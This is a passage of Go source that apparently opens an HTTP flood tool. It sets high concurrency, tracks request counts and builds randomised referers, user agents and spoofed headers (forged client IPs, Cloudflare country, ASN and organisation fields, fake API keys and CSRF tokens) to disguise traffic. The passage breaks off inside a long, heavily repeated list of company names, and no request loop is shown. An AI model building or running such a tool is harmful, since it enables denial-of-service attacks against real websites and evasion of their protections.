package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/corpix/uarand"
	"golang.org/x/net/http2"
)

var (
	startTime    = time.Now()
	requests     int64
	successCount int64
	failedCount  int64
	concurrency  = 550
	referers     []string
	secHeaders   []string
	orgs         []string
	domains      []string
	paths        []string
	countries    = []string{
    "US", "GB", "DE", "FR", "CA", "JP", "AU", "BR", "IN", "SG",
    "NL", "KR", "ID", "MY", "VN", "TH", "PH", "IT", "ES", "MX",
    "CN", "HK", "TW", "ZA", "NG", "NO", "SE", "CH", "AE", "SA",
    "IL", "TR", "NZ", "PT", "PL", "RU", "AR", "CO", "PE", "CL",
    "AT", "BE", "DK", "FI", "GR", "HU", "IE", "IS", "LU", "MT",
    "CZ", "SK", "SI", "HR", "BA", "RS", "ME", "MK", "AL", "BG",
    "RO", "UA", "BY", "MD", "GE", "AM", "AZ", "KZ", "UZ", "TM",
    "KG", "TJ", "MN", "AF", "PK", "BD", "LK", "NP", "BT", "MM",
    "LA", "KH", "BN", "TL", "PG", "FJ", "WS", "TO", "VU", "SB",
    "KI", "TV", "NR", "MH", "FM", "PW", "CK", "NU", "WF", "PF",
    "NC", "AS", "GU", "MP", "PR", "VI", "AG", "BB", "BS", "BZ",
    "CR", "CU", "DM", "DO", "GD", "GT", "HN", "HT", "JM", "KN",
    "LC", "NI", "PA", "SV", "TT", "AW", "BM", "KY", "CW", "GL",
    "GP", "MQ", "MS", "TC", "VG", "AI", "BL", "MF", "PM", "SX",
    "BQ", "GF", "GY", "SR", "VE", "BO", "EC", "PY", "UY", "FK",
    "DZ", "EG", "LY", "MA", "TN", "AO", "BW", "BI", "BF", "CM",
    "CF", "TD", "CG", "CD", "CI", "DJ", "ER", "ET", "GA", "GM",
    "GH", "GN", "GW", "KE", "LS", "LR", "MG", "MW", "ML", "MR",
    "MU", "MZ", "NA", "NE", "RW", "SN", "SC", "SL", "SO", "SS",
    "SD", "SZ", "TG", "TZ", "UG", "ZM", "ZW", "EH", "KM", "ST",
    "CV", "GQ", "SH", "YT", "RE", "TF", "BV", "HM", "AQ", "AX",
    "GG", "IM", "JE", "MC", "AD", "LI", "SM", "VA", "GI", "FO",
    "SJ", "XK", "MO", "IO", "CC", "CX", "NF", "PN", "GS", "UM",
}
	mu           sync.Mutex
)

const (
	Reset   = "\033[0m"
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Cyan    = "\033[36m"
	Blue    = "\033[34m"
	Magenta = "\033[35m"
)

func init() {
	rand.Seed(time.Now().UnixNano())
	initReferers()
	initOrgs()
	initDomains()
	initPaths()
	initSecHeaders()
}

func initReferers() {
    referers = []string{
        "https://www.google.com/search?q=",
        "https://www.youtube.com/watch?v=",
        "https://www.facebook.com/",
        "https://twitter.com/home",
        "https://www.instagram.com/",
        "https://www.linkedin.com/feed/",
        "https://www.reddit.com/",
        "https://www.tiktok.com/",
        "https://www.amazon.com/",
        "https://www.netflix.com/",
        "https://www.microsoft.com/",
        "https://www.apple.com/",
        "https://openai.com/",
        "https://github.com/",
        "https://stackoverflow.com/",
        "https://news.ycombinator.com/",
        "https://www.washingtonpost.com/",
        "https://www.nytimes.com/",
        "https://www.bbc.com/",
        "https://www.cnn.com/",
        "https://www.alexa.com/topsites",
        "https://en.wikipedia.org/wiki/Special:Random",
        "https://www.imdb.com/",
        "https://www.ebay.com/",
        "https://www.walmart.com/",
        "https://www.twitch.tv/",
        "https://www.paypal.com/",
        "https://www.adobe.com/",
        "https://www.spotify.com/",
        "https://www.quora.com/",
        "https://www.pinterest.com/",
        "https://www.dropbox.com/",
        "https://www.etsy.com/",
        "https://www.flickr.com/",
        "https://www.slideshare.net/",
        "https://medium.com/",
        "https://change.org/",
        "https://ted.com/",
        "https://wikihow.com/",
        "https://healthline.com/",
        "https://businessinsider.com/",
        "https://forbes.com/",
        "https://bloomberg.com/",
        "https://techcrunch.com/",
        "https://mozilla.org/",
        "https://w3.org/",
        "https://nginx.org/",
        "https://apache.org/",
        "https://microsoftonline.com/",
        "https://office.com/",
        "https://drive.google.com/",
        "https://docs.google.com/",
        "https://mail.google.com/",
        "https://maps.google.com/",
        "https://play.google.com/",
        "https://photos.google.com/",
        "https://cloudflare.com/",
        "https://akamai.com/",
        "https://fastly.com/",
        "https://aws.amazon.com/",
        "https://azure.microsoft.com/",
        "https://cloud.google.com/",
        "https://digitalocean.com/",
        "https://oracle.com/",
        "https://ibm.com/",
        "https://intel.com/",
        "https://amd.com/",
        "https://nvidia.com/",
        "https://qualcomm.com/",
        "https://arm.com/",
        "https://docker.com/",
        "https://kubernetes.io/",
        "https://jenkins.io/",
        "https://gitlab.com/",
        "https://bitbucket.org/",
        "https://atlassian.com/",
        "https://slack.com/",
        "https://trello.com/",
        "https://asana.com/",
        "https://basecamp.com/",
        "https://notion.so/",
        "https://figma.com/",
        "https://adobe.com/creativecloud.html",
        "https://autodesk.com/",
        "https://unity.com/",
        "https://unrealengine.com/",
        "https://godotengine.org/",
        "https://blender.org/",
        "https://wikipedia.org/",
        "https://wikimedia.org/",
        "https://wiktionary.org/",
        "https://wikiquote.org/",
        "https://wikibooks.org/",
        "https://wikinews.org/",
        "https://wikisource.org/",
        "https://wikiversity.org/",
        "https://wikivoyage.org/",
        "https://wikidata.org/",
        "https://mediawiki.org/",
        "https://foundation.wikimedia.org/",
        "https://www.google.com/search?q=keyword1",
        "https://www.google.com/search?q=keyword2",
        "https://www.google.com/search?q=keyword3",
        "https://www.google.com/search?q=keyword4",
        "https://www.google.com/search?q=keyword5",
        "https://www.google.com/search?q=keyword6",
        "https://www.google.com/search?q=keyword7",
        "https://www.google.com/search?q=keyword8",
        "https://www.google.com/search?q=keyword9",
        "https://www.google.com/search?q=keyword10",
        "https://www.youtube.com/watch?v=videoID1",
        "https://www.youtube.com/watch?v=videoID2",
        "https://www.youtube.com/watch?v=videoID3",
        "https://www.youtube.com/watch?v=videoID4",
        "https://www.youtube.com/watch?v=videoID5",
        "https://www.youtube.com/watch?v=videoID6",
        "https://www.youtube.com/watch?v=videoID7",
        "https://www.youtube.com/watch?v=videoID8",
        "https://www.youtube.com/watch?v=videoID9",
        "https://www.youtube.com/watch?v=videoID10",
        "https://www.facebook.com/page1",
        "https://www.facebook.com/page2",
        "https://www.facebook.com/page3",
        "https://www.facebook.com/page4",
        "https://www.facebook.com/page5",
        "https://www.facebook.com/page6",
        "https://www.facebook.com/page7",
        "https://www.facebook.com/page8",
        "https://www.facebook.com/page9",
        "https://www.facebook.com/page10",
        "https://twitter.com/user1",
        "https://twitter.com/user2",
        "https://twitter.com/user3",
        "https://twitter.com/user4",
        "https://twitter.com/user5",
        "https://twitter.com/user6",
        "https://twitter.com/user7",
        "https://twitter.com/user8",
        "https://twitter.com/user9",
        "https://twitter.com/user10",
        "https://www.instagram.com/user1",
        "https://www.instagram.com/user2",
        "https://www.instagram.com/user3",
        "https://www.instagram.com/user4",
        "https://www.instagram.com/user5",
        "https://www.instagram.com/user6",
        "https://www.instagram.com/user7",
        "https://www.instagram.com/user8",
        "https://www.instagram.com/user9",
        "https://www.instagram.com/user10",
        "https://www.linkedin.com/in/user1",
        "https://www.linkedin.com/in/user2",
        "https://www.linkedin.com/in/user3",
        "https://www.linkedin.com/in/user4",
        "https://www.linkedin.com/in/user5",
        "https://www.linkedin.com/in/user6",
        "https://www.linkedin.com/in/user7",
        "https://www.linkedin.com/in/user8",
        "https://www.linkedin.com/in/user9",
        "https://www.linkedin.com/in/user10",
        "https://www.reddit.com/r/subreddit1",
        "https://www.reddit.com/r/subreddit2",
        "https://www.reddit.com/r/subreddit3",
        "https://www.reddit.com/r/subreddit4",
        "https://www.reddit.com/r/subreddit5",
        "https://www.reddit.com/r/subreddit6",
        "https://www.reddit.com/r/subreddit7",
        "https://www.reddit.com/r/subreddit8",
        "https://www.reddit.com/r/subreddit9",
        "https://www.reddit.com/r/subreddit10",
        "https://www.tiktok.com/@user1",
        "https://www.tiktok.com/@user2",
        "https://www.tiktok.com/@user3",
        "https://www.tiktok.com/@user4",
        "https://www.tiktok.com/@user5",
        "https://www.tiktok.com/@user6",
        "https://www.tiktok.com/@user7",
        "https://www.tiktok.com/@user8",
        "https://www.tiktok.com/@user9",
        "https://www.tiktok.com/@user10",
        "https://www.amazon.com/product1",
        "https://www.amazon.com/product2",
        "https://www.amazon.com/product3",
        "https://www.amazon.com/product4",
        "https://www.amazon.com/product5",
        "https://www.amazon.com/product6",
        "https://www.amazon.com/product7",
        "https://www.amazon.com/product8",
        "https://www.amazon.com/product9",
        "https://www.amazon.com/product10",
        "https://www.netflix.com/title/1",
        "https://www.netflix.com/title/2",
        "https://www.netflix.com/title/3",
        "https://www.netflix.com/title/4",
        "https://www.netflix.com/title/5",
        "https://www.netflix.com/title/6",
        "https://www.netflix.com/title/7",
        "https://www.netflix.com/title/8",
        "https://www.netflix.com/title/9",
        "https://www.netflix.com/title/10",
        "https://www.microsoft.com/en-us/windows",
        "https://www.microsoft.com/en-us/office",
        "https://www.microsoft.com/en-us/azure",
        "https://www.microsoft.com/en-us/dynamics",
        "https://www.microsoft.com/en-us/edge",
        "https://www.microsoft.com/en-us/teams",
        "https://www.microsoft.com/en-us/xbox",
        "https://www.microsoft.com/en-us/surface",
        "https://www.microsoft.com/en-us/hololens",
        "https://www.microsoft.com/en-us/research",
        "https://www.apple.com/iphone",
        "https://www.apple.com/ipad",
        "https://www.apple.com/mac",
        "https://www.apple.com/watch",
        "https://www.apple.com/tv",
        "https://www.apple.com/music",
        "https://www.apple.com/news",
        "https://www.apple.com/retail",
        "https://www.apple.com/support",
        "https://www.apple.com/jobs",
        "https://openai.com/blog",
        "https://openai.com/research",
        "https://openai.com/api",
        "https://openai.com/gpt-3",
        "https://openai.com/dall-e",
        "https://openai.com/codex",
        "https://openai.com/gpt-4",
        "https://openai.com/safety",
        "https://openai.com/community",
        "https://openai.com/careers",
        "https://github.com/explore",
        "https://github.com/trending",
        "https://github.com/features",
        "https://github.com/pricing",
        "https://github.com/marketplace",
        "https://github.com/security",
        "https://github.com/enterprise",
        "https://github.com/team",
        "https://github.com/education",
        "https://github.com/about",
        "https://stackoverflow.com/questions",
        "https://stackoverflow.com/jobs",
        "https://stackoverflow.com/teams",
        "https://stackoverflow.com/advertising",
        "https://stackoverflow.com/collectives",
        "https://stackoverflow.com/talent",
        "https://stackoverflow.com/enterprise",
        "https://stackoverflow.com/overflow",
        "https://stackoverflow.com/about",
        "https://stackoverflow.com/help",
        "https://news.ycombinator.com/newest",
        "https://news.ycombinator.com/front",
        "https://news.ycombinator.com/show",
        "https://news.ycombinator.com/ask",
        "https://news.ycombinator.com/jobs",
        "https://news.ycombinator.com/best",
        "https://news.ycombinator.com/active",
        "https://news.ycombinator.com/noobstories",
        "https://news.ycombinator.com/submitted",
        "https://news.ycombinator.com/comments",
        "https://www.washingtonpost.com/politics",
        "https://www.washingtonpost.com/world",
        "https://www.washingtonpost.com/business",
        "https://www.washingtonpost.com/technology",
        "https://www.washingtonpost.com/lifestyle",
        "https://www.washingtonpost.com/opinions",
        "https://www.washingtonpost.com/sports",
        "https://www.washingtonpost.com/local",
        "https://www.washingtonpost.com/goingoutguide",
        "https://www.washingtonpost.com/obituaries",
        "https://www.nytimes.com/section/politics",
        "https://www.nytimes.com/section/world",
        "https://www.nytimes.com/section/business",
        "https://www.nytimes.com/section/technology",
        "https://www.nytimes.com/section/science",
        "https://www.nytimes.com/section/health",
        "https://www.nytimes.com/section/sports",
        "https://www.nytimes.com/section/arts",
        "https://www.nytimes.com/section/books",
        "https://www.nytimes.com/section/style",
        "https://www.bbc.com/news",
        "https://www.bbc.com/sport",
        "https://www.bbc.com/culture",
        "https://www.bbc.com/travel",
        "https://www.bbc.com/future",
        "https://www.bbc.com/worklife",
        "https://www.bbc.com/reel",
        "https://www.bbc.com/weather",
        "https://www.bbc.com/newsround",
        "https://www.bbc.com/bitesize",
        "https://www.cnn.com/politics",
        "https://www.cnn.com/world",
        "https://www.cnn.com/business",
        "https://www.cnn.com/health",
        "https://www.cnn.com/entertainment",
        "https://www.cnn.com/style",
        "https://www.cnn.com/travel",
        "https://www.cnn.com/sport",
        "https://www.cnn.com/videos",
        "https://www.cnn.com/live-tv",
        "https://www.alexa.com/topsites/countries",
        "https://www.alexa.com/topsites/category",
        "https://www.alexa.com/topsites/global",
        "https://www.alexa.com/topsites/local",
        "https://www.alexa.com/topsites/regional",
        "https://www.alexa.com/topsites/arts",
        "https://www.alexa.com/topsites/business",
        "https://www.alexa.com/topsites/computers",
        "https://www.alexa.com/topsites/games",
        "https://www.alexa.com/topsites/health",
        "https://en.wikipedia.org/wiki/Main_Page",
        "https://en.wikipedia.org/wiki/Portal:Current_events",
        "https://en.wikipedia.org/wiki/Portal:Contents",
        "https://en.wikipedia.org/wiki/Portal:Featured_content",
        "https://en.wikipedia.org/wiki/Portal:Contents/Portals",
        "https://en.wikipedia.org/wiki/Portal:Contents/Lists",
        "https://en.wikipedia.org/wiki/Portal:Contents/Outlines",
        "https://en.wikipedia.org/wiki/Portal:Contents/Glossaries",
        "https://en.wikipedia.org/wiki/Portal:Contents/Indices",
        "https://en.wikipedia.org/wiki/Portal:Contents/Categories",
    }
}

func initSecHeaders() {
	secHeaders = []string{
		"Sec-CH-UA: \"Chromium\";v=\"121\", \"Not A;Brand\";v=\"99\"",
		"Sec-CH-UA-Mobile: ?0",
		"Sec-CH-UA-Platform: \"Windows\"",
		"Sec-CH-UA-Platform-Version: \"15.0.0\"",
		"Sec-CH-UA-Arch: \"x86\"",
		"Sec-CH-UA-Bitness: \"64\"",
		"Sec-CH-UA-Model: \"\"",
		"Sec-CH-UA-Full-Version-List: \"Chromium\";v=\"121.0.6167.160\", \"Not A;Brand\";v=\"99.0.0.0\"",
		"Sec-Fetch-Dest: document",
		"Sec-Fetch-Mode: navigate",
		"Sec-Fetch-Site: same-origin",
		"Sec-Fetch-User: ?1",
		"Sec-GPC: 1",
		"Priority: u=1, i",
		"Purpose: prefetch",
		"Service-Worker-Navigation-Preload: true",
		"CDN-Loop: cloudflare",
		"CF-Visitor: {\"scheme\":\"https\"}",
		"CF-Connecting-IP: 1.1.1.1",
		"True-Client-IP: 1.1.1.1",
		"X-Forwarded-Proto: https",
		"X-Forwarded-Port: 443",
		"X-Edge-Connect: mid",
		"X-Request-ID: " + GUUID(),
		"X-Correlation-ID: " + GUUID(),
		"X-Client-Data: " + GCD(),
		"X-Requested-With: XMLHttpRequest",
		"X-CSRF-Token: " + GT(),
		"X-API-Version: 3",
		"X-Content-Type-Options: nosniff",
		"X-DNS-Prefetch-Control: on",
		"X-Download-Options: noopen",
		"X-Frame-Options: SAMEORIGIN",
		"X-Permitted-Cross-Domain-Policies: none",
		"X-RateLimit-Limit: 100",
		"X-RateLimit-Remaining: 99",
		"X-RateLimit-Reset: " + fmt.Sprint(time.Now().Add(60*time.Second).Unix()),
		"X-XSS-Protection: 1; mode=block",
		"X-Debug-Info: debug=1",
		"X-Request-Start: t=" + fmt.Sprint(time.Now().UnixMicro()),
		"X-Client-Version: 3.2.1",
		"X-Device-Id: " + GUUID(),
		"X-Cloud-Trace-Context: " + GTID(),
		"X-Forwarded-TLSClient-Cert: " + GCH(),
		"X-Content-Duration: " + fmt.Sprint(rand.Intn(5000)),
		"X-Content-Security-Policy: default-src 'self'",
		"X-WebKit-CSP: default-src 'self'",
		"X-Forwarded-Server: edge-server",
		"X-Edge-Request-ID: " + GUUID(),
		"X-Origin-Request-ID: " + GUUID(),
		"X-Api-Key: " + GT(),
		"X-Request-Signature: " + GT(),
		"X-Cloudflare-Features: ssr",
		"X-Cloudflare-Client: enterprise",
		"X-Cloudflare-IP-Country: " + countries[rand.Intn(len(countries))],
		"X-Cloudflare-IP-ASN: AS" + fmt.Sprint(rand.Intn(100000)),
		"X-Cloudflare-IP-Organization: " + GON(),
		"X-Edge-IP: " + GRIP(),
		"X-Forwarded-Host: " + GFH(),
		"X-Original-URL: /" + GFP(),
	}
}

func GUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func GT() string {
	b := make([]byte, 32)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func GCD() string {
	data := []string{
		"experiments=optimize_speed",
		"prefers_color_scheme=dark",
		"reduced_motion=true",
		"time_zone=Asia/Jakarta",
		"device_memory=" + fmt.Sprint(4+rand.Intn(12)),
		"hardware_concurrency=" + fmt.Sprint(2+rand.Intn(16)),
		"platform=win32",
		"bitness=64",
		"wow64=true",
		"accept_lang=en-US",
		"prefers_reduced_transparency=true",
		"prefers_reduced_data=true",
		"save_data=on",
	}
	return strings.Join(data, ";")
}

func GTID() string {
	return fmt.Sprintf("%x/%x", rand.Uint64(), rand.Uint32())
}

func GCH() string {
	b := make([]byte, 32)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func initOrgs() {
	orgs = []string{
        "Google LLC", "Amazon Inc", "Microsoft Corp", "Apple Inc", "Cloudflare Inc",
        "Akamai Technologies", "DigitalOcean LLC", "Oracle Corporation", "IBM Corp", "Tencent Holdings",
        "Meta Platforms Inc", "Alibaba Group", "Baidu Inc", "JD.com", "ByteDance Ltd",
        "Netflix Inc", "Adobe Inc", "Salesforce Inc", "SAP SE", "Intel Corporation",
        "AMD Inc", "NVIDIA Corporation", "Qualcomm Incorporated", "Cisco Systems", "Hewlett Packard Enterprise",
        "Dell Technologies", "Lenovo Group", "Huawei Technologies", "Samsung Electronics", "Sony Corporation",
        "LG Electronics", "Panasonic Corporation", "Xiaomi Corporation", "Oppo Electronics", "Vivo Communication",
        "Tesla Inc", "SpaceX", "PayPal Holdings", "Stripe Inc", "Square Inc",
        "Shopify Inc", "Ebay Inc", "Walmart Inc", "Target Corporation", "Costco Wholesale",
        "Uber Technologies", "Lyft Inc", "Airbnb Inc", "Booking Holdings", "Expedia Group",
        "Spotify Technology", "Snap Inc", "Twitter Inc", "Pinterest Inc", "Reddit Inc",
        "LinkedIn Corporation", "Zoom Video Communications", "Slack Technologies", "Atlassian Corporation", "Trello Inc",
        "Asana Inc", "Notion Labs", "Figma Inc", "Canva Inc", "Autodesk Inc",
        "Unity Software", "Epic Games", "Valve Corporation", "Electronic Arts", "Activision Blizzard",
        "GitHub Inc", "GitLab Inc", "Bitbucket", "JetBrains s.r.o.", "MongoDB Inc",
        "Red Hat Inc", "SUSE", "Canonical Ltd", "Mozilla Corporation", "Apache Software Foundation",
        "WordPress Foundation", "Drupal Association", "Linux Foundation", "OpenAI", "DeepMind Technologies",
        "Palantir Technologies", "Snowflake Inc", "Databricks Inc", "ServiceNow Inc", "Workday Inc",
        "Zoho Corporation", "Intuit Inc", "Xero Limited", "Freshworks Inc", "Zendesk Inc",
        "HubSpot Inc", "Mailchimp", "Hootsuite Inc", "Buffer Inc", "Sprout Social",
        "Zscaler Inc", "Okta Inc", "CrowdStrike Holdings", "Palo Alto Networks", "Fortinet Inc",
        "Check Point Software", "Symantec Corporation", "McAfee Corp", "Trend Micro", "VMware Inc",
        "Citrix Systems", "Nutanix Inc", "Veeam Software", "Commvault Systems", "Twilio Inc",
        "SendGrid", "Nexmo", "Vonage Holdings", "RingCentral Inc", "Confluent Inc",
        "Elastic NV", "Splunk Inc", "New Relic", "Dynatrace Inc", "AppDynamics",
        "SolarWinds Corporation", "PagerDuty Inc", "DataDog Inc", "Fastly Inc", "Vercel Inc",
        "Netlify Inc", "Heroku", "Render Inc", "AWS", "Azure",
        "Google Cloud", "IBM Cloud", "Oracle Cloud", "Alteryx Inc", "Tableau Software",
        "QlikTech International", "Looker Data", "Sisense Inc", "Domo Inc", "ThoughtSpot Inc",
        "Cognizant Technology", "Infosys Limited", "Wipro Limited", "Tata Consultancy Services", "Accenture PLC",
        "Capgemini SE", "DXC Technology", "NTT Data", "Fujitsu Limited", "Hitachi Ltd",
        "NEC Corporation", "Toshiba Corporation", "Mitsubishi Electric", "Siemens AG", "Ericsson",
        "Nokia Corporation", "ZTE Corporation", "Rakuten Group", "SoftBank Group", "Square Enix",
        "Bandai Namco", "Sega Corporation", "Konami Holdings", "Capcom Co", "Ubisoft Entertainment",
        "Take-Two Interactive", "Riot Games", "Cloud Imperium Games", "Niantic Inc", "Rovio Entertainment",
        "Supercell Oy", "King Digital", "Wargaming Group", "NetEase Inc", "Perfect World",
        "Bilibili Inc", "Hoyoverse", "Zillow Group", "Redfin Corporation", "Realtor.com",
        "Trulia Inc", "Opendoor Technologies", "Compass Inc", "WeWork Inc", "Regus PLC",
        "IWG PLC", "Knotel Inc", "Coursera Inc", "Udemy Inc", "edX Inc",
        "Khan Academy", "Pluralsight Inc", "Skillshare Inc", "MasterClass", "Duolingo Inc",
        "Rosetta Stone", "Babbel GmbH", "Grammarly Inc", "ProWritingAid", "Evernote Corporation",
        "Dropbox Inc", "Box Inc", "OneDrive", "iCloud", "Mega Limited",
        "pCloud AG", "Sync.com", "Wix.com Ltd", "Squarespace Inc", "Webflow Inc",
        "WordPress.com", "Joomla", "BigCommerce", "Magento Commerce", "WooCommerce",
        "PrestaShop", "Etsy Inc", "Alibaba.com", "Taobao", "Tmall",
        "Mercado Libre", "Zalando SE", "ASOS Plc", "Farfetch Limited", "Wayfair Inc",
        "Overstock.com", "Houzz Inc", "IKEA Group", "Home Depot", "Lowe's Companies",
        "Best Buy", "Newegg Inc", "B&H Photo", "Micro Center", "Salesforce.com",
        "Atlassian", "Workday", "ServiceNow", "Snowflake Computing", "Palantir Technologies",
        "Intuit", "Xero", "Freshworks", "Zendesk", "HubSpot",
        "Mailchimp Inc", "Hootsuite", "Buffer", "Sprout Social Inc", "Zoho Corp",
        "Okta", "CrowdStrike", "Palo Alto Networks", "Fortinet", "Check Point",
        "Symantec", "McAfee", "Trend Micro Inc", "VMware", "Citrix",
        "Nutanix", "Veeam", "Commvault", "Twilio", "Vonage",
        "RingCentral", "Confluent", "Elastic", "Splunk", "New Relic Inc",
        "Dynatrace", "AppDynamics Inc", "SolarWinds", "PagerDuty", "DataDog",
        "Fastly", "Vercel", "Netlify", "Heroku Inc", "Render",
        "Alteryx", "Tableau", "Qlik", "Looker", "Sisense",
        "Domo", "ThoughtSpot", "Cognizant", "Infosys", "Wipro",
        "TCS", "Accenture", "Capgemini", "DXC Tech", "NTT Data Corporation",
        "Fujitsu", "Hitachi", "NEC", "Toshiba", "Mitsubishi",
        "Siemens", "Ericsson AB", "Nokia", "ZTE", "Rakuten",
        "SoftBank", "Square Enix Holdings", "Bandai Namco Entertainment", "Sega", "Konami",
        "Capcom", "Ubisoft", "Take-Two", "Riot", "Cloud Imperium",
        "Niantic", "Rovio", "Supercell", "King", "Wargaming",
        "NetEase", "Perfect World Entertainment", "Bilibili", "Hoyoverse Inc", "Zillow",
        "Redfin", "Realtor", "Trulia", "Opendoor", "Compass",
        "WeWork", "Regus", "IWG", "Knotel", "Coursera",
        "Udemy", "edX", "Khan Academy Inc", "Pluralsight", "Skillshare",
        "MasterClass Inc", "Duolingo", "Rosetta Stone Inc", "Babbel", "Grammarly",
        "ProWritingAid Ltd", "Evernote", "Dropbox", "Box", "OneDrive Inc",
        "iCloud Inc", "Mega", "pCloud", "Sync", "Wix",
        "Squarespace", "Webflow", "WordPress", "Joomla Inc", "BigCommerce Inc",
        "Magento", "WooCommerce Inc", "PrestaShop SA", "Etsy", "Alibaba",
        "Taobao Inc", "Tmall Inc", "Mercado Libre Inc", "Zalando", "ASOS",
        "Farfetch", "Wayfair", "Overstock", "Houzz", "IKEA",
        "Home Depot Inc", "Lowe's", "Best Buy Co", "Newegg", "B&H",
        "Micro Center Inc", "Adobe Systems", "Autodesk", "Unity", "Epic Games Inc",
        "Valve", "EA", "Activision", "GitHub", "GitLab",
        "Bitbucket Inc", "JetBrains", "MongoDB", "Red Hat", "SUSE Linux",
        "Canonical", "Mozilla", "Apache", "WordPress Foundation Inc", "Drupal",
        "Linux Foundation Inc", "OpenAI Inc", "DeepMind", "Palantir", "Snowflake",
        "Databricks", "ServiceNow", "Workday Inc", "Zoho", "Intuit Inc",
        "Xero Inc", "Freshworks Inc", "Zendesk Inc", "HubSpot Inc", "Mailchimp Inc",
        "Hootsuite Inc", "Buffer Inc", "Sprout Social Inc", "Zscaler", "Okta Inc",
        "CrowdStrike Inc", "Palo Alto Networks Inc", "Fortinet Inc", "Check Point Software Technologies",
        "Symantec Corp", "McAfee Inc", "Trend Micro Incorporated", "VMware Inc", "Citrix Systems Inc",
        "Nutanix Inc", "Veeam Software Corporation", "Commvault Systems Inc", "Twilio Inc", "SendGrid Inc",
        "Nexmo Inc", "Vonage Holdings Corp", "RingCentral Inc", "Confluent Inc", "Elastic NV",
        "Splunk Inc", "New Relic Inc", "Dynatrace Inc", "AppDynamics Inc", "SolarWinds Corporation",
        "PagerDuty Inc", "DataDog Inc", "Fastly Inc", "Vercel Inc", "Netlify Inc",
        "Heroku Inc", "Render Inc", "Alteryx Inc", "Tableau Software LLC", "QlikTech International AB",
        "Looker Data Sciences", "Sisense Inc", "Domo Inc", "ThoughtSpot Inc", "Cognizant Technology Solutions",
        "Infosys Ltd", "Wipro Ltd", "Tata Consultancy Services Ltd", "Accenture PLC", "Capgemini SE",
        "DXC Technology Company", "NTT Data Corporation", "Fujitsu Ltd", "Hitachi Ltd", "NEC Corporation",
        "Toshiba Corporation", "Mitsubishi Electric Corporation", "Siemens AG", "Ericsson AB", "Nokia Corporation",
        "ZTE Corporation", "Rakuten Group Inc", "SoftBank Group Corp", "Square Enix Holdings Co", "Bandai Namco Entertainment Inc",
        "Sega Corporation", "Konami Holdings Corporation", "Capcom Co Ltd", "Ubisoft Entertainment SA", "Take-Two Interactive Software",
        "Riot Games Inc", "Cloud Imperium Games Corporation", "Niantic Inc", "Rovio Entertainment Corporation", "Supercell Oy",
        "King Digital Entertainment", "Wargaming Group Limited", "NetEase Inc", "Perfect World Co", "Bilibili Inc",
        "Hoyoverse Inc", "Zillow Group Inc", "Redfin Corporation", "Realtor.com", "Trulia Inc",
        "Opendoor Technologies Inc", "Compass Inc", "WeWork Inc", "Regus PLC", "IWG PLC",
        "Knotel Inc", "Coursera Inc", "Udemy Inc", "edX Inc", "Khan Academy Inc",
        "Pluralsight Inc", "Skillshare Inc", "MasterClass Inc", "Duolingo Inc", "Rosetta Stone Inc",
        "Babbel GmbH", "Grammarly Inc", "ProWritingAid Ltd", "Evernote Corporation", "Dropbox Inc",
        "Box Inc", "OneDrive Inc", "iCloud Inc", "Mega Limited", "pCloud AG",
        "Sync.com Inc", "Wix.com Ltd", "Squarespace Inc", "Webflow Inc", "WordPress.com",
        "Joomla Inc", "BigCommerce Inc", "Magento Commerce", "WooCommerce Inc", "PrestaShop SA",
        "Etsy Inc", "Alibaba.com", "Taobao Inc", "Tmall Inc", "Mercado Libre Inc",
        "Zalando SE", "ASOS Plc", "Farfetch Limited", "Wayfair Inc", "Overstock.com",
        "Houzz Inc", "IKEA Group", "Home Depot Inc", "Lowe's Companies Inc", "Best Buy Co",
        "Newegg Inc", "B&H Photo Video", "Micro Center Inc", "Adobe Systems Incorporated", "Autodesk Inc",
        "Unity Software Inc", "Epic Games Inc", "Valve Corporation", "Electronic Arts Inc", "Activision Blizzard Inc",
        "GitHub Inc", "GitLab Inc", "Bitbucket Inc", "JetBrains s.r.o.", "MongoDB Inc",
        "Red Hat Inc", "SUSE Linux GmbH", "Canonical Ltd", "Mozilla Corporation", "Apache Software Foundation",
        "WordPress Foundation", "Drupal Association", "Linux Foundation", "OpenAI Inc", "DeepMind Technologies Limited",
        "Palantir Technologies Inc", "Snowflake Inc", "Databricks Inc", "ServiceNow Inc", "Workday Inc",
        "Zoho Corporation Pvt", "Intuit Inc", "Xero Limited", "Freshworks Inc", "Zendesk Inc",
        "HubSpot Inc", "Mailchimp Inc", "Hootsuite Inc", "Buffer Inc", "Sprout Social Inc",
        "Zscaler Inc", "Okta Inc", "CrowdStrike Holdings Inc", "Palo Alto Networks Inc", "Fortinet Inc",
        "Check Point Software Technologies Ltd", "Symantec Corporation", "McAfee Corp", "Trend Micro Incorporated", "VMware Inc",
        "Citrix Systems Inc", "Nutanix Inc", "Veeam Software Corporation", "Commvault Systems Inc", "Twilio Inc",
        "SendGrid Inc", "Nexmo Inc", "Vonage Holdings Corp", "RingCentral Inc", "Confluent Inc",
        "Elastic NV", "Splunk Inc", "New Relic Inc", "Dynatrace Inc", "AppDynamics Inc",
        "SolarWinds Corporation", "PagerDuty Inc", "DataDog Inc", "Fastly Inc", "Vercel Inc",
        "Netlify Inc", "Heroku Inc", "Render Inc", "Alteryx Inc", "Tableau Software LLC",
        "QlikTech International AB", "Looker Data Sciences", "Sisense Inc", "Domo Inc", "ThoughtSpot Inc",
        "Cognizant Technology Solutions", "Infosys Ltd", "Wipro Ltd", "Tata Consultancy Services Ltd", "Accenture PLC",
        "Capgemini SE", "DXC Technology Company", "NTT Data Corporation", "Fujitsu Ltd", "Hitachi Ltd",
        "NEC Corporation", "Toshiba Corporation", "Mitsubishi Electric Corporation", "Siemens AG", "Ericsson AB",
        "Nokia Corporation", "ZTE Corporation", "Rakuten Group Inc", "SoftBank Group Corp", "Square Enix Holdings Co",
        "Bandai Namco Entertainment Inc", "Sega Corporation", "Konami Holdings Corporation", "Capcom Co Ltd", "Ubisoft Entertainment SA",
        "Take-Two Interactive Software", "Riot Games Inc", "Cloud Imperium Games Corporation", "Niantic Inc", "Rovio Entertainment Corporation",
